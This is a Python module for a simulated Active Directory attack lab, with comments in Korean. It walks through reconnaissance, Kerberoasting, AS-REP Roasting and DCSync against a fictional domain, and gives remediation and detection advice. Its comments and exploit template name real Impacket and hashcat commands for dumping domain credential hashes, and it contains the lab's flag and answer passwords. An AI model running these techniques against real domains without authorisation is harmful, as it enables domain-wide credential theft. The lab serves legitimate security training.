"""AD/Kerberos 공격 실습 — App 9(Pwn/Reverse)·App 10(Web CTF)·App 13(모의 해킹 랩)과 같은 방식으로,
실제 Windows Server/Samba AD를 띄우지 않고도(무겁고 준비가 오래 걸림) 실제 공격 흐름과 판정 로직을
그대로 재현하는 로컬 시뮬레이터. 가상 도메인 CORP.LOCAL을 대상으로 Kerberoasting → (선택) AS-REP
Roasting → DCSync 권한 오용까지, 실제 기업 침해사고에서 가장 흔하게 등장하는 AD 공격 체인 하나를
처음부터 끝까지 연습한다.

Kerberos 프로토콜 자체(실제 KDC와의 암호화 통신)를 구현하지는 않는다 — 대신 "해시/티켓을 확보하고
오프라인에서 크랙한다"는 판정 로직을 실제로 구현해, 계정별 취약 속성(SPN 보유, 사전인증 비활성화,
잘못 부여된 복제 권한)을 실제로 조회·악용해야만 진행되게 만들었다. 서버 재시작 시 상태가 초기화되는
로컬 개발/학습 전용 도구다(App 9/10/13/25-실습랩과 동일한 스코프 — history.db에 저장하지 않음).
"""

import hashlib

DOMAIN = "CORP.LOCAL"

ROE_NOTICE = (
    "실제 Active Directory 환경에 대한 Kerberoasting/AS-REP Roasting/DCSync 같은 기법은 반드시 "
    "서면 승인(RoE, Rules of Engagement)을 받은 모의해킹 범위 내에서만 사용하세요. 이 랩은 승인 절차 "
    "없이 안전하게 연습할 수 있도록 만든 로컬 시뮬레이션이며, 여기서 배운 기법을 승인받지 않은 실제 "
    "도메인에 사용하는 것은 명백한 불법 행위입니다."
)

FLAG = "AD{k3rb3r0ast_w34k_svc_pw_dcsync_domain_0wn3d}"

# ── 가상 도메인 계정 ---------------------------------------------------------
ACCOUNTS = {
    "j.kim": {
        "role": "Domain Admin",
        "password": None,
        "spn": None,
        "preauth_disabled": False,
        "replication_rights": False,
        "note": "실제 관리자 계정입니다 — 이 랩에서 직접 공격할 대상이 아닙니다.",
    },
    "svc_backup": {
        "role": "서비스 계정 (DB 백업 자동화)",
        "password": "Summer2023!",
        "spn": "MSSQLSvc/db01.corp.local:1433",
        "preauth_disabled": False,
        "replication_rights": True,
        "note": "DB 백업 자동화용 계정. 담당자가 편의를 위해 도메인 복제 권한(Replicating Directory "
                "Changes — 원래 도메인 컨트롤러만 가져야 함)까지 실수로 함께 부여함.",
    },
    "svc_scan": {
        "role": "서비스 계정 (레거시 취약점 스캐너)",
        "password": "Winter2022!",
        "spn": None,
        "preauth_disabled": True,
        "replication_rights": False,
        "note": "오래된 스캐너 연동 때문에 Kerberos 사전인증(preauthentication)이 꺼져 있는 계정.",
    },
    "alice": {"role": "일반 사용자", "password": "AlicePw!2026", "spn": None, "preauth_disabled": False, "replication_rights": False, "note": None},
    "bob": {"role": "일반 사용자", "password": "BobPw!2026", "spn": None, "preauth_disabled": False, "replication_rights": False, "note": None},
}

# 실제 무차별 대입/사전 공격 도구(hashcat 등)를 흉내낸 소규모 커스텀 워드리스트.
# 회사명+계절+연도 조합은 실제 펜테스트에서도 매우 흔하게 시도하는 패턴이다.
WORDLIST = [
    "Password1!", "Welcome1!", "CorpLocal2024!", "Company123!", "P@ssw0rd123",
    "Spring2024!", "Autumn2023!", "Backup2023!", "Summer2023!", "Winter2022!",
]


def recon(query: str) -> str:
    q = (query or "").strip().lower()
    if q in ("spn", "kerberoast"):
        lines = ["ServicePrincipalName 이 설정된 계정 (Kerberoasting 대상 후보):", ""]
        found = False
        for name, info in ACCOUNTS.items():
            if info["spn"]:
                found = True
                lines.append(f"{info['spn']:<38} {name:<12} {info['role']}")
        if not found:
            lines.append("(없음)")
        return "\n".join(lines)
    if q in ("preauth", "asrep", "asreproast"):
        lines = ["Kerberos 사전인증이 꺼진 계정 (AS-REP Roasting 대상 후보):", ""]
        found = False
        for name, info in ACCOUNTS.items():
            if info["preauth_disabled"]:
                found = True
                lines.append(f"{name:<12} userAccountControl=0x410200 (DONT_REQ_PREAUTH)   {info['note'] or ''}")
        if not found:
            lines.append("(없음)")
        return "\n".join(lines)
    if q in ("all", "*", ""):
        lines = [f"Domain: {DOMAIN}  (LDAP 계정 열거 결과 — Get-ADUser -Filter * 에 해당)", ""]
        for name, info in ACCOUNTS.items():
            spn = info["spn"] or "-"
            preauth = "DONT_REQ_PREAUTH" if info["preauth_disabled"] else "-"
            lines.append(f"{name:<12} role={info['role']:<30} SPN={spn:<32} flags={preauth}")
        lines.append("")
        lines.append("특정 조건만 보려면 query=spn 또는 query=preauth 로 다시 조회하세요.")
        return "\n".join(lines)
    return f"알 수 없는 조회입니다. query=all, spn, preauth 중 하나를 사용하세요. (입력값: {query})"


def kerberoast(spn: str) -> dict:
    spn = (spn or "").strip()
    for name, info in ACCOUNTS.items():
        if info["spn"] == spn:
            fake_hash = hashlib.sha256(f"{name}:{info['spn']}".encode()).hexdigest()[:48]
            return {
                "account": name,
                "spn": info["spn"],
                "ticket_hash": f"$krb5tgs$23$*{name}${DOMAIN}${info['spn']}*${fake_hash}",
                "note": "TGS 티켓 자체로는 아무것도 못 합니다 — 오프라인에서 크랙해야 평문 비밀번호를 알 수 있습니다. "
                        "/crack 엔드포인트나 /wordlist로 받은 목록으로 시도해보세요.",
            }
    return {"error": f"'{spn}' SPN을 가진 계정을 찾을 수 없습니다. 먼저 /recon?query=spn 으로 실제 SPN 값을 확인하세요."}


def asrep_roast(username: str) -> dict:
    username = (username or "").strip()
    info = ACCOUNTS.get(username)
    if not info or not info["preauth_disabled"]:
        return {"error": f"'{username}' 계정은 사전인증이 켜져 있어 AS-REP Roasting이 불가능합니다 "
                          "(사전인증이 켜져 있으면 올바른 비밀번호 없이는 이 요청 자체가 거부됩니다)."}
    fake_hash = hashlib.sha256(f"asrep:{username}".encode()).hexdigest()[:48]
    return {
        "account": username,
        "as_rep_hash": f"$krb5asrep$23${username}@{DOMAIN}:${fake_hash}",
        "note": "이 계정은 사전인증 없이도 AS-REQ만 보내면 암호화된 응답(AS-REP)을 그대로 내어줍니다 — "
                "역시 오프라인 크래킹 대상입니다. /crack 으로 이어가보세요.",
    }


def crack(account: str, password_guess: str) -> dict:
    info = ACCOUNTS.get((account or "").strip())
    if not info or info["password"] is None:
        return {"cracked": False, "error": "크랙할 수 있는 대상 계정이 아닙니다."}
    if (password_guess or "").strip() == info["password"]:
        return {"cracked": True, "account": account, "password": info["password"]}
    return {"cracked": False, "account": account}


def dcsync(username: str, password: str) -> dict:
    username = (username or "").strip()
    info = ACCOUNTS.get(username)
    if not info or info["password"] != password:
        return {"error": "자격증명이 올바르지 않습니다."}
    if not info["replication_rights"]:
        return {"error": f"'{username}' 계정은 인증에는 성공했지만 도메인 복제 권한(Replicating Directory "
                          "Changes)이 없어 DCSync를 수행할 수 없습니다. 이 권한을 가진 계정을 다시 찾아보세요."}
    return {
        "success": True,
        "dumped": {
            "krbtgt": hashlib.md5(b"krbtgt-fake-nthash").hexdigest(),
            "Administrator": hashlib.md5(b"administrator-fake-nthash").hexdigest(),
        },
        "flag": FLAG,
        "note": f"'{username}' 계정에 원래 도메인 컨트롤러만 가져야 할 복제 권한이 잘못 부여되어 있어, "
                "이 계정의 자격증명만으로 전체 도메인의 자격증명 해시를 덤프(DCSync)할 수 있었습니다. "
                "krbtgt 해시가 있으면 이론상 Golden Ticket까지 이어질 수 있습니다.",
    }


def verify_flag(flag: str) -> dict:
    return {"correct": (flag or "").strip() == FLAG}


STAGES = [
    {
        "id": "recon",
        "title": "1단계 · AD 계정 정찰",
        "meaning": "Active Directory 정찰 — 도메인 계정의 속성(SPN, userAccountControl 플래그 등)을 열거해 "
                   "Kerberoasting/AS-REP Roasting 같은 공격이 통할 만한 취약 계정을 찾는 첫 단계입니다. "
                   "실제로는 BloodHound, PowerView, Impacket의 GetADUsers.py 같은 도구로 수행합니다.",
        "situation": f"{DOMAIN} 도메인에 대한 내부 모의해킹을 서면 승인받았습니다. 아무 도메인 계정(예: 일반 사용자)으로 "
                     "인증만 되면 기본적으로 다른 계정의 여러 속성을 조회할 수 있는 것이 AD의 기본 동작입니다.",
        "endpoint": "GET /api/ad-attack-lab/recon?query=all|spn|preauth",
        "hints": [
            "query=all 로 먼저 전체 계정 목록과 속성을 확인하세요.",
            "SPN(ServicePrincipalName)이 설정된 계정은 Kerberoasting 대상이 될 수 있습니다 — query=spn 으로 좁혀보세요.",
            "userAccountControl에 DONT_REQ_PREAUTH가 있는 계정은 AS-REP Roasting 대상이 될 수 있습니다 — query=preauth 로 확인하세요.",
        ],
        "remediation": {
            "summary": "정찰 자체(LDAP 읽기)를 완전히 막을 수는 없습니다 — 도메인에 인증된 사용자는 기본적으로 대부분의 속성을 읽을 수 있습니다.",
            "fixes": [
                "BloodHound 같은 공격 그래프 도구를 방어팀도 정기적으로 돌려, 공격자가 볼 수 있는 경로를 먼저 파악하세요.",
                "불필요하게 넓은 LDAP 읽기 권한(예: 일반 사용자에게 과도한 확장 권한)이 있는지 정기 감사하세요.",
                "대량 LDAP 쿼리·SPN 열거 패턴을 SIEM에서 탐지하도록 규칙을 구성하세요(예: 짧은 시간 내 다수 계정 속성 조회).",
            ],
            "code_example": "",
        },
    },
    {
        "id": "kerberoast",
        "title": "2단계 · Kerberoasting",
        "meaning": "Kerberoasting — SPN이 설정된 계정에 대한 서비스 티켓(TGS)은 그 계정의 비밀번호로 암호화되어 발급됩니다. "
                   "도메인의 아무 사용자나 이 티켓을 요청할 수 있고, 서버와의 상호작용 없이 오프라인에서 무차별 대입으로 "
                   "비밀번호를 알아낼 수 있습니다 — 서비스 계정 비밀번호가 사람이 고른 값이라면 특히 취약합니다.",
        "situation": "정찰에서 svc_backup 계정이 MSSQLSvc SPN을 갖고 있는 것을 확인했습니다. 이 계정의 TGS 티켓을 요청해보세요.",
        "endpoint": "POST /api/ad-attack-lab/kerberoast {spn} → POST /api/ad-attack-lab/crack {account, password_guess}",
        "hints": [
            "1단계에서 확인한 정확한 SPN 문자열(MSSQLSvc/db01.corp.local:1433)로 /kerberoast를 호출하세요.",
            "받은 티켓은 그 자체로는 아무 의미가 없습니다 — 실제로는 hashcat -m 13100 같은 도구로 오프라인 무차별 대입을 합니다. "
            "이 랩에서는 GET /api/ad-attack-lab/wordlist 로 받은 후보 목록을 하나씩 /crack 에 넣어보세요.",
            "서비스 계정 비밀번호는 사람이 만든 값(회사명+계절+연도 패턴 등)인 경우가 실무에서도 매우 흔합니다.",
        ],
        "remediation": {
            "summary": "서비스 계정에 사람이 고른 정적 비밀번호를 쓰고 있어, 오프라인 무차별 대입에 취약한 전형적인 Kerberoasting 사례입니다.",
            "fixes": [
                "서비스 계정은 gMSA(Group Managed Service Account)를 사용해 120자 이상의 비밀번호를 자동으로 주기적으로 교체하세요.",
                "gMSA를 쓸 수 없다면 서비스 계정 비밀번호를 25자 이상의 무작위 값으로 설정하고 정기적으로 교체하세요.",
                "이벤트 4769(Kerberos 서비스 티켓 요청)에서 암호화 유형이 RC4(0x17)인 비정상 요청을 모니터링하세요 — 최신 AES 대신 RC4를 강제로 요청하는 것이 Kerberoasting 도구의 흔한 특징입니다.",
                "가능하면 서비스 계정을 'Protected Users' 그룹에 포함시켜 RC4/위임 등 취약한 옵션 자체를 비활성화하세요.",
            ],
            "code_example": "",
        },
    },
    {
        "id": "asrep_roast",
        "title": "3단계 (추가 실습) · AS-REP Roasting",
        "optional": True,
        "meaning": "AS-REP Roasting — Kerberos 사전인증(preauthentication)이 꺼진 계정은 그 계정의 비밀번호를 몰라도 "
                   "AS-REQ만으로 암호화된 AS-REP 응답을 받을 수 있어, 역시 오프라인 무차별 대입이 가능합니다. "
                   "Kerberoasting과 달리 SPN이 없는 계정도 대상이 될 수 있다는 점이 다릅니다.",
        "situation": "정찰에서 svc_scan 계정에 DONT_REQ_PREAUTH 플래그가 설정된 것을 확인했습니다. (이 단계는 최종 flag 획득에 "
                     "필수는 아니지만, Kerberoasting과는 다른 별도의 AD 공격 기법을 연습하기 위한 것입니다.)",
        "endpoint": "POST /api/ad-attack-lab/asrep-roast {username} → POST /api/ad-attack-lab/crack {account, password_guess}",
        "hints": [
            "username=svc_scan 으로 /asrep-roast 를 호출해보세요 — 인증 정보 없이도 응답을 받을 수 있습니다.",
            "받은 해시도 Kerberoasting과 동일하게 /crack 과 워드리스트로 오프라인 크랙합니다.",
        ],
        "remediation": {
            "summary": "특별한 이유 없이 Kerberos 사전인증을 꺼두면, 인증 시도 자체 없이도 크랙 가능한 데이터를 공격자에게 내주는 셈입니다.",
            "fixes": [
                "사전인증을 반드시 꺼야 하는 특별한 이유가 없다면 모든 계정에서 활성화(기본값)로 되돌리세요.",
                "부득이하게 꺼야 한다면 해당 계정 비밀번호를 매우 길고 무작위하게 설정하세요.",
                "이벤트 4768(AS-REQ)에서 사전인증 없이 발급된 티켓 패턴을 모니터링하세요.",
            ],
            "code_example": "",
        },
    },
    {
        "id": "dcsync",
        "title": "4단계 · 권한 오용 (DCSync)로 도메인 장악",
        "meaning": "DCSync — 'Replicating Directory Changes'/'Replicating Directory Changes All' 권한을 가진 "
                   "계정이라면(원래는 도메인 컨트롤러만 가져야 함), 도메인 컨트롤러 흉내를 내어 도메인 내 모든 계정의 "
                   "자격증명 해시(krbtgt 포함)를 직접 요청해 받아낼 수 있는 권한 오용 기법입니다.",
        "situation": "2단계에서 크랙한 svc_backup 계정의 자격증명이 있습니다. 이 계정에 원래는 없어야 할 권한이 부여되어 있을 수 있습니다.",
        "endpoint": "POST /api/ad-attack-lab/dcsync {username, password}",
        "hints": [
            "2단계에서 크랙에 성공한 계정명과 비밀번호를 그대로 /dcsync 에 넣어보세요.",
            "이 계정이 왜 이 요청에 성공하는지 생각해보세요 — 정상적인 서비스 계정이라면 이 권한이 있으면 안 됩니다.",
        ],
        "remediation": {
            "summary": "도메인 컨트롤러만 가져야 할 복제 권한이 일반 서비스 계정에 잘못 부여되어, 그 계정 하나만 뚫려도 도메인 전체가 장악당하는 가장 치명적인 유형의 AD 권한 오용입니다.",
            "fixes": [
                "'Replicating Directory Changes'/'Replicating Directory Changes All' 권한을 도메인 컨트롤러와 명시적으로 승인된 소수 계정(예: Azure AD Connect 서비스 계정)에만 남기고 나머지는 모두 회수하세요.",
                "BloodHound의 GetChangesAll/GetChanges 엣지를 정기적으로 감사해 예상 밖의 권한 보유 계정을 찾아내세요.",
                "이벤트 4662(디렉터리 서비스 접근)에서 도메인 컨트롤러가 아닌 IP로부터의 복제 관련 요청(특정 GUID)을 모니터링·알림하세요.",
                "가장 근본적으로는 2단계의 Kerberoasting 자체를 막아 svc_backup의 비밀번호가 크랙되지 않도록 하세요 — 이 단계는 그 실패의 최종 결과일 뿐입니다.",
            ],
            "code_example": "",
        },
    },
]

EXPLOIT_TEMPLATE = '''#!/usr/bin/env python3
"""AD/Kerberos 공격 실습 - 전체 익스플로잇 템플릿
정찰 -> Kerberoasting으로 svc_backup 크랙 -> DCSync로 도메인 전체 해시 덤프
실제 환경에서는 Impacket의 GetUserSPNs.py / secretsdump.py, hashcat 같은 도구를 사용합니다.
이 랩은 같은 개념 흐름을 로컬 API로 안전하게 재현합니다."""
import requests

BASE = "http://localhost:8000/api/ad-attack-lab"

# 1단계: 정찰 (실제로는 GetUserSPNs.py -dc-ip <IP> corp.local/user:pass 에 해당)
print("=== 1단계: 정찰 ===")
print(requests.get(f"{BASE}/recon", params={"query": "spn"}).json()["output"])

# 2단계: Kerberoasting (실제로는 GetUserSPNs.py ... -request 로 TGS 확보 후 hashcat -m 13100)
print("\\n=== 2단계: Kerberoasting ===")
spn = "MSSQLSvc/db01.corp.local:1433"
ticket = requests.post(f"{BASE}/kerberoast", json={"spn": spn}).json()
print(ticket)
account = ticket["account"]

wordlist = requests.get(f"{BASE}/wordlist").text.splitlines()
password = None
for guess in wordlist:
    r = requests.post(f"{BASE}/crack", json={"account": account, "password_guess": guess}).json()
    if r.get("cracked"):
        password = r["password"]
        print(f"크랙 성공: {account} / {password}")
        break

# 3단계: DCSync (실제로는 secretsdump.py corp.local/svc_backup:<password>@<DC-IP> -just-dc)
print("\\n=== 3단계: DCSync ===")
result = requests.post(f"{BASE}/dcsync", json={"username": account, "password": password}).json()
print(result)
'''
